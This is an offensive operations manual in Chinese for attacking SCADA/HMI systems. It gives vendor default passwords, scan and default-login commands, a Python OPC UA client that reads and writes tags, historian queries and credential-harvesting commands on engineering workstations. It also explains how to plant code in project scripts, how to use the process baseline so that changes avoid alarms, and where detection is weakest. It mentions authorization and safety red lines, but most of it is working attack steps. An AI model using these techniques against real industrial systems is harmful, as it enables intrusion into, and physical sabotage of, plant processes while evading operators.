# SCADA / HMI 实操手册

被 `scada-hmi-attack` 引用。讲监督层（HMI / SCADA 服务器 / 历史库 / OPC / 工程师站）的具体手法。

> 前置：先读 `references/ot-safe-assessment.md` 的红线清单。
> HMI 的「可操作 Tag」= 工艺影响面，动它之前必须有工艺工程师在场。

---

## 一、HMI 面板（现场触摸屏）

### 进入设置（各厂商路径）

```text
Siemens Comfort Panel / Basic Panel
  Control Panel 按钮（画面角落，常被隐藏）或 长按某区域 3-5 秒
  → Control Panel → Transfer（改 IP / 开 Remote Control）
  → 开 "Remote Control" 后用 SM@RTClient（PC 端软件）接管画面
  判据：能改 IP = 网络层已控；能开 Remote = 画面层已控

Allen-Bradley PanelView Plus
  Config 模式：上电时长按白色区域（或 Function 键组合）
  → 可改 IP、可进 Windows CE 桌面（部分型号）
  判据：进 CE 桌面 = 有文件系统，可放工具

Pro-face / 威纶通（Weintek）
  长按屏幕 3 秒 → 系统设置（默认密码常见 111111 / 888888）
  判据：能进设置 = 可改通讯参数（指向你的伪 SCADA）

Mitsubishi GOT
  GOT 设置模式（上电时长按左上角）
  默认密码：无 或 5710（视型号）
```

**判据（最关键的一条）**：HMI 能操作的 Tag 范围 = 工程文件里绑到画面的全部 Tag。
**拿到 HMI 控制权 ≈ 拿到这些 Tag 的写权限，且不需要 PLC 密码。**

### 从 HMI 侧横向（比打 PLC 容易）

```text
HMI 面板通常有两个网口：
  · 一个接 PLC 网段（L1/L2）
  · 一个接现场网段或维护口
判据：直连第二个网口 = 直接在同一 OT 网段上，绕过防火墙
这是物理接触时的最快路径
```

---

## 二、SCADA 服务器

### 2.1 先认产品（指纹）

```bash
# ── Web 面指纹 ──
for p in 80 443 8088 8043 8080; do
  echo "--- :$p ---"
  curl -s -k --max-time 3 "http://$TARGET:$p/" -o /tmp/x 2>/dev/null
  curl -s -k --max-time 3 "https://$TARGET:$p/" -o /tmp/x 2>/dev/null
  grep -ioE "wincc|ignition|citect|ifix|wonderware|intouch|factorytalk|scada|hmi|opc" /tmp/x | head -3
done

# ── 端口特征 ──
nmap -Pn -p 8088,8043,1433,135,4840,44818 "$TARGET" -sV
# 8088/8043 = Ignition 网关
# 1433 = SCADA 的历史库（MSSQL）
# 135 = OPC DA 的 DCOM
# 4840 = OPC UA
```

| 产品 | 特征端口 | 默认凭据 | 工程目录 |
| --- | --- | --- | --- |
| Ignition | 8088（HTTP）/ 8043（HTTPS） | `admin` / `password`（首登强制改，但常没改） | `<install>/data/projects/` |
| WinCC | 1433（MSSQL）/ 135 | 无 Web 默认凭据；走 Windows 认证 | `C:\Users\<user>\Documents\<项目名>` |
| iFIX | 135（DCOM） | 无 Web 面 | `C:\Program Files (x86)\GE\iFIX\` |
| Citect | 135 / 20222 | 无 Web 面 | `C:\Program Files (x86)\Schneider Electric\Citect SCADA\` |
| FactoryTalk View | 1433 / 4483 | Windows 认证 | `C:\Program Files (x86)\Rockwell Software\` |
| Wonderware InTouch | 1433 | Windows 认证 | `C:\Program Files (x86)\Wonderware\` |

### 2.2 Ignition 的默认口令（最容易拿到的一个）

```bash
# Ignition 网关登录（默认 admin/password）
curl -s -X POST "http://$TARGET:8088/main/system/webdev/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password" -i | head -20
# 判据：Set-Cookie 里有 session = 登录成功

# 登录后能做什么：
#   · /main/webconfig/ → 改数据库连接（指向你的库）
#   · /main/projects/ → 看/改全部项目（含脚本）
#   · /main/system/gateway → 网关设置（可改 SSL、可加用户）
```

**判据**：Ignition 的 `admin` 账号权限极大（可改全部项目脚本）。
拿到它 ≈ 拿到整个 SCADA 应用的代码执行权（脚本是 Jython，能跑系统命令）。

### 2.3 SCADA 工程目录（比认证更好打）

```text
关键判据：这些文件**通常没有完整性校验**。
能写文件 = 能改逻辑，下次 SCADA 重启（或热加载）就生效。

这比打 PLC 隐蔽：
  · PLC 的下载会在诊断缓冲区留记录
  · SCADA 改文件可能只有文件审计（多数组织没开 FIM）
```

```bash
# ── 找工程目录（常在用户文档下，不在 Program Files）──
find /c/Users -maxdepth 4 -type d \( -iname "*wincc*" -o -iname "*ignition*" -o -iname "*ifix*" -o -iname "*citect*" \) 2>/dev/null

# ── Ignition 的脚本（Jython，能跑系统命令）──
find <ignition>/data/projects -name "*.py" | head
grep -rn "import subprocess\|Runtime.getRuntime" <ignition>/data/projects | head
# 判据：找到能跑的脚本点 = 可植入（改脚本 = 代码执行）

# ── WinCC 的 C 脚本 ──
grep -rn "SetTag\|GetTag\|ProgramExecute" "<项目名>/ScriptLib/" | head
```

### 2.4 OPC UA（4840）无认证

```python
import asyncio
from asyncua import Client

async def main():
    c = Client("opc.tcp://10.0.0.10:4840")
    eps = await c.connect_and_get_server_endpoints()
    for e in eps:
        print(e.EndpointUrl, e.SecurityPolicyUri)

    await c.connect()
    # 浏览：Objects → DeviceSet → 设备 → Tag
    objs = c.nodes.objects
    for ch in await objs.get_children()[:5]:
        print(await ch.read_browse_name())

    # 写（危险，验伤必备）
    node = c.get_node("ns=2;s=PLC1.Setpoint")
    old = await node.read_value()
    print("原值:", old)
    # await node.write_value(42)      # 授权后才做
    # assert await node.read_value() == 42

    await c.disconnect()

asyncio.run(main())
```

**OPC UA 无认证的价值**：
- 能读全部 Tag（工艺全貌）
- **能写**（多数服务器默认允许）
- 写操作**不进 PLC 的诊断缓冲区** —— 看起来像 SCADA 自己在写

**判据**：`SecurityPolicyUri` 结尾是 `/None` 且 `MessageSecurityMode` = `None` = 可匿名读写。

---

## 三、历史库

### 3.1 三个产品，三种打法

```bash
# ── InfluxDB（8086）—— 常无认证 ──
curl -s "http://$TARGET:8086/query?q=SHOW+DATABASES"
# 返回 {"results":[{"series":[...]}]} = 无认证
curl -s "http://$TARGET:8086/query?db=plant&q=SHOW+MEASUREMENTS"
curl -s "http://$TARGET:8086/query?db=plant&q=SELECT+*+FROM+%22temperature%22+LIMIT+5"

# ── OSIsoft PI（5450 / Web API 443）──
curl -s -k "https://$TARGET/piwebapi/system/status"
curl -s -k "https://$TARGET/piwebapi/dataservers"
curl -s -k "https://$TARGET/piwebapi/points?nameFilter=*"

# ── Wonderware Historian（MSSQL 1433）──
python3 -m impacket.examples.mssqlclient "sa:weakpass@$TARGET" -windows-auth
# 表名常含 History / Tag / Analog
```

### 3.2 从历史库提取「工艺基线」（这是隐蔽性的依据）

```sql
-- 找关键 Tag 的正常范围（InfluxDB）
SELECT MIN(value), MAX(value), MEAN(value) FROM "Tank_Level" WHERE time > now() - 30d GROUP BY time(1d)

-- 找报警阈值配置
SHOW MEASUREMENTS;  -- 常含 alarm / threshold / setpoint 类 measurement

-- 找人员作息（谁在什么时候操作）
SELECT * FROM "operator_log" WHERE time > now() - 7d LIMIT 100
```

**判据（这一条决定了隐蔽性是否有依据）**：
拿到基线，你就知道「改多少不会被报警抓到」。
**没做这一步就改东西，等于闭着眼睛在产线上试** —— 而且改一下就被抓到，
报告里写"可隐蔽修改"是彻底的虚标。

---

## 四、工程师站（EWS）—— OT 里的"域控"

### 4.1 为什么它是最佳跳板

```text
EWS 的三个特征：
  · 域成员（能用域凭据横向）
  · **到所有 PLC/SCADA 都有网络通路**（否则工程师没法下装）
  · 本地管理员常是共用账号（ENG / admin / Operator）
```

**这条链的价值**：`IT 边界 → EWS → 所有 PLC/SCADA`。
比直接打 PLC 现实得多 —— PLC 常被隔离，而 EWS **必须双向可达**。

### 4.2 到 EWS 之后做什么

```bash
# ── 确认它的网络位置（这就是你要的跳板）──
ipconfig /all
route print
# 判据：EWS 通常有双网卡或在特殊网段（能直达 L1/L2）

# ── 扫它能直达的 PLC ──
nmap -Pn -sT -T2 --max-rate 10 -p 102,502,44818,4840 <EWS 能到的网段>

# ── 找保存的凭据 ──
cmdkey /list                                    # Windows 凭据管理器
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"   # RDP 历史
# 工程软件保存的连接串（WinCC/iFIX 常明文或弱加密）
grep -riE "password|pwd|connectionstring|user id" "C:\Program Files*\Siemens" "C:\Program Files*\GE" 2>/dev/null | head

# ── 找工程文件（这是最有价值的资产）──
find /c/Users -maxdepth 5 \( -name "*.ap16" -o -name "*.L5X" -o -name "*.MCP" -o -name "*.ACD" \) 2>/dev/null
```

### 4.3 EWS 上的持久化（极少做）

```text
理由：EWS 通常在生产网段，装任何东西都可能是"产线事故"。
替代做法：
  · 只在 EWS 上做**内存操作**（不落盘）
  · 或者拿它的凭据/工程文件走人，不在它上面维持
判据：OT 里做持久化的风险远高于收益 —— 对方一次巡检就发现。
```

---

## 五、验伤（监督层的三类假成功）

### 假成功 1：登录成功但只能看不能写

```text
SCADA 常分三级：操作员（看）/ 工程师（改组态）/ 管理员（改系统）
判据：登录后找一个**只有工程师能改**的东西试（如报警阈值）：
  · 403 或界面灰色 = 只是操作员
  · 能改并保存 = 工程师级
不要用"能打开管理页面"判断权限 —— 页面能打开不代表能提交。
```

### 假成功 2：OPC 连上但写被拒

```text
OPC UA 的服务端可以允许 browse 但禁 write。
判据：真写一个**无害的**测试点（不在用的 Tag），再读回来。
  返回 BadNotWritable = 只读；
  写进去能读回 = 可写。
```

### 假成功 3：改了 SCADA 但 PLC 没变

```text
SCADA 有本地缓存/队列表。
判据：从 PLC 直读（Modbus FC3 / S7 db_read）确认值真的变了。
只看 SCADA 画面变了 = 可能只是改了显示。
```

### 最有价值的一条验伤：改历史数据能不能不留痕

```text
很多 SCADA 的历史库在 SQL 里。改数据会留 UPDATE 审计。
判据：查一下 SQL 的审计配置（`SELECT * FROM sys.dm_audit_actions`），
      或者看有没有开 SQL Server Audit。
没测这一步就在报告里写"可掩盖痕迹"= 虚标。
```

---

## 六、检测视角（这一层的检测空白在哪）

| 动作 | 防守方看哪里 | 实际有没有人看 |
| --- | --- | --- |
| HMI 设置页进入 | HMI 本地日志（多数不开） | **几乎没人看** |
| SCADA 登录 | SCADA 审计（WinCC Audit / Ignition Audit） | 少数开了 |
| SQL 直连 1433 | SQL 登录失败日志 | 有时看 |
| OPC UA 连接 | OPC 服务器日志（需开审计） | **多数没开** |
| 历史库查询 | 时序库日志 | 很少看 |
| 工程文件修改 | **文件完整性监控（FIM）** | **几乎没有人开** |

**实用推论**：**这一层最大的检测空白是「文件完整性」**。
SCADA 工程目录的改动，绝大多数组织没有任何监控。
所以演练时要专门测：**改一个工程脚本，对方多久发现**（答案常是"永远不发现"）。
这条结论比"我打进去了"有价值得多 —— 它说明的是一个**结构性缺陷**，不是一次运气。

---

## 七、常见坑

1. **先入为主认为 SCADA 在 Program Files** —— 工程目录常在 `Documents\` 下。
2. **用 Web 扫描器打 SCADA** —— SCADA 的 Web 面很小（几个固定路由），扫描器会刷满日志。
   手工逐个试路由更隐蔽。
3. **以为 OPC UA 有认证就是安全的** —— 很多部署是 `SecurityPolicy=None`（无认证）。
4. **改 SCADA 工程文件后不重启/不热加载就宣布成功** —— 改动未生效。
5. **没算工艺基线就改设定值** —— 立刻触发报警。
6. **在 EWS 上装工具** —— OT 里最容易被巡检发现的动作。
7. **忽略 HMI 的第二网口** —— 物理接触时这是最快的旁路，常被忘了测。